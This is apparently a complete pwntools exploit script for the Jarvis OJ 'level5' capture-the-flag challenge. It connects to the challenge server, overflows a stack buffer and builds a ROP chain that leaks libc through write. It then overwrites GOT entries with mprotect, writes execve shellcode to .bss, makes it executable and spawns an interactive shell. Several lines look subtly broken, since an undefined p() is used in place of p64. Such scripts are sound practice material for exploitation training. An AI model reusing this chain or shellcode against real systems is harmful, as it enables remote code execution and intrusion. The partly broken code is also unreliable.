#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

Io = remote('pwn2.jarvisoj.com', 9884)
#Io = process('./level5')
bin = ELF('./level5')
libc = ELF('libc-2.19.so')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#-------------------------write & hijack---------------------------
rdi_ret_addr = 0x4006b3
rsi_r15_ret_addr = 0x4006b1
# leak mprotect_addr
payload = ""
payload += 'A' * (0x80 + 0x08)
payload += p64(rdi_ret_addr) + p64(0x01)
payload += p64(rsi_r15_ret_addr) + p64(bin.got['read']) + p64(0)
payload += p64(bin.plt['write'])
# write mprotect_addr
payload += p64(rdi_ret_addr) + p64(0x00)
payload += p64(rsi_r15_ret_addr) + p64(bin.got['__libc_start_main']) + p64(0)
payload += p64(bin.plt['read'])
# write shellcode
payload += p64(rsi_r15_ret_addr) + p64(bin.bss()) + p64(0)
payload += p64(bin.plt['read'])
# write bss_shellcode_addr
payload += p64(rsi_r15_ret_addr) + p64(bin.got['__gmon_start__']) + p64(0)
payload += p64(bin.plt['read'])
payload += p64(bin.symbols['main'])

Io.recvuntil('Input:\n')
Io.send(payload)
read_addr = u64(Io.recv()[0:8])
mprotect_addr = read_addr - libc.symbols['read'] + libc.symbols['mprotect']
success("read_addr: " + hex(read_addr))
success("mprotect_addr: " + hex(mprotect_addr))

Io.send(p64(mprotect_addr))

sh = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
print len(sh)
Io.send(sh)

Io.send(p64(bin.bss()))

#----------------------------call & getshell----------------------------
payload = ""
payload += 'A' * (0x80 + 0x08)
payload += p64(0x4006A6)
# mprotect(0x600000, 0x1000, 7)
payload += 'AAAAAAAA'
payload += p64(0) # pop rbx
payload += p64(1) # pop rbp
payload += p(bin.got['__libc_start_main']) # pop r12
payload += p64(7) # pop r13
payload += p64(0x1000) # pop r14
payload += p64(0x600000) # pop r15
payload += p64(0x400690)
# sh()
payload += 'AAAAAAAA'
payload += p64(0) # pop rbx
payload += p64(1) # pop rbp
payload += p64(bin.got['__gmon_start__']) # pop r12
payload += p(0) # pop r13
payload += p(0) # pop rbx
payload += p(0) # pop rbp
payload += p(0x400690)

Io.recvuntil('Input:\n')
Io.send(payload)
Io.interactive()
